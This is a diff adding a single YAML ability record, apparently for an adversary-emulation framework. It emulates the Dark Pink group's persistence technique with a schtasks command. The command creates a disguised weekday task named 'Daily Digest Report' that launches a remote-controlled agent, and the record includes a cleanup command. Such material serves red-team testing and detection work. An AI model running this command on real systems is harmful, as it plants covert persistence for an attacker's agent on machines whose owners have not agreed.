@@ -1,0 +1,35 @@
+- tactic: persistence
+  technique_name: 'Scheduled Task/Job: Scheduled Task'
+  technique_id: T1053.005
+  name: Scheduled Agent Execution (schtask.exe)
+  description: This ability is derived from APT Dark Pink.  It uses schtasks.exe to
+    create a scheduled task that executes a specified agent at 09:30 every weekday.
+  executors:
+  - name: psh
+    platform: windows
+    command: 'schtasks /Create /F /TN "Daily Digest Report" /TR "''#{location}'' -server
+      #{server} -group #{group}" ` /SC weekly /D MON,TUE,WED,THU,FRI /ST 09:30; '
+    code: null
+    language: null
+    build_target: null
+    payloads: []
+    uploads: []
+    timeout: 60
+    parsers: []
+    cleanup:
+    - 'schtasks /delete /tn "Daily Digest Report" /f
+
+      '
+    variations: []
+    additional_info: {}
+  requirements: []
+  privilege: ''
+  repeatable: false
+  buckets:
+  - persistence
+  additional_info: {}
+  access: {}
+  singleton: false
+  plugin: ''
+  delete_payload: true
+  id: fbde845d-6c6c-4a46-9501-be18c3425e43
